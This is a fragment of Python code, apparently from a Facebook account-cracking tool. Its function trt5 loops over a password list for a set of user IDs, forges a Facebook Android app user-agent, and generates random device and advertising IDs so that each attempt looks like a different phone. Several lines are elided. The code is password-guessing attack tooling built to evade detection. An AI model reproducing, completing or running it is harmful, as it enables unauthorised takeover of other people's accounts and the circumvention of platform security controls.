...
def trt5(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/'+fbrv+';FBCR/Willkommen;FBMF/samsung;FBBD/'+Samsung+';FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/'+fbsv+';FBOP/'+fbop+';FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
